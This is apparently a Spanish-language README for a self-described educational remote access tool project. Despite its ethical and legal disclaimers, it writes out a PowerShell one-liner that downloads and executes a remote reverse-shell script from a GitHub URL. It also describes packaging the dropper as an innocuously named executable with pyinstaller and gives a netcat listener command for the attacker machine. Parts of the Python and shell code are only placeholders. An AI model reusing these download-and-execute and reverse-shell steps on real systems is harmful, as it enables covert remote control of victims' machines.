# Remote Code Execution Educational Project
⚠️ **ADVERTENCIA CRÍTICA: PROYECTO SOLO PARA FINES EDUCATIVOS**

---

## Descripción del Proyecto
Este repositorio contiene código educativo diseñado exclusivamente para comprender el funcionamiento de los RAT (Remote Administration Tools) y técnicas de ejecución remota de código. El objetivo es proporcionar material de estudio para profesionales de ciberseguridad, investigadores y estudiantes en entornos controlados.

🚨 **USO RESPONSABLE REQUERIDO**

- Solo ejecutar en laboratorios aislados  
- Nunca utilizar contra sistemas sin autorización explícita  
- Comprender las implicaciones legales antes de proceder

---

## Estructura del Proyecto

### Paso 1: Ejecución Remota mediante PowerShell Ofuscado
El proyecto implementa una técnica común de ofuscación usando Base64 para ejecutar código PowerShell remotamente.

**Comando Original:**
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/akthanon/cybersecurity-tools/refs/heads/main/shell.ps1')"
```

```python
import os

# Comando PowerShell ofuscado en Base64
chocolate.py
```

---

### Paso 2: Compilación a Ejecutable
Compilación del script Python a archivo ejecutable:

```
chocolate.exe
```

```bash
pyinstaller --onefile .\chocolate.py
```

---

### Shell PowerShell (`shell.ps1`)
Código para establecer conexión reversa:

```
shell.ps1
```

---

### Configuración del Listener
En la máquina atacante (solo para pruebas educativas):

```bash
nc -lvnp 4444
```

---

### Payload de Ejemplo (Divertido)
```
...
Write-Host "Abriendo video de YouTube..."
Start-Process $video
```

---

## 🔒 Advertencias de Seguridad

⚠️ **DECLARACIÓN LEGAL IMPORTANTE**

- **USO ÉTICO OBLIGATORIO:** Este código debe usarse solo con fines educativos.  
- **AUTORIZACIÓN REQUERIDA:** Nunca ejecutar en sistemas sin permiso explícito.  
- **RESPONSABILIDAD DEL USUARIO:** El mal uso de este material es responsabilidad exclusiva del usuario.  
- **CONSECUENCIAS LEGALES:** El uso no autorizado puede violar leyes locales e internacionales.

---

## Configuración Segura Recomendada
- Ejecutar en máquinas virtuales aisladas  
- Usar redes de laboratorio separadas  
- Desactivar conexión a internet durante pruebas  
- Monitorear con herramientas de seguridad

---

## Objetivos Educativos
- Comprender técnicas de ofuscación de código  
- Analizar mecanismos de ejecución remota  
- Estudiar patrones de comportamiento de RAT  
- Desarrollar contramedidas de detección

---

## Contribuciones
Se aceptan contribuciones que mejoren el valor educativo o añadan análisis de detección y prevención.

---

⚠️ **RECUERDA:** El conocimiento es poder, pero la responsabilidad es esencial. Usa este material sabiamente.
